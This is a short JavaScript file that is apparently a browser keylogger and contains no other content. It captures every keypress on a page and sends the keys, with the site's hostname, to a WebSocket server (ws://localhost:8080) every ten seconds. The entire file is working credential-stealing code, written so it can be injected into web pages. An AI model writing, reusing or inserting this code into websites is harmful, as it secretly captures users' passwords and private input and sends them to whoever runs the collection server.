var keys='';
var ws_addr = 'ws://localhost:8080';


document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
};
window.setInterval(function(){
    if(keys.length>0) {
        ws = new WebSocket(ws_addr);
        ws.onopen = function() {
            /* Web Socket is connected, send data using send()*/
            ws.send(window.location.hostname+ ': '+keys);
            /*console.log(keys)*/
            keys = '';
        };
    };
}, 10000);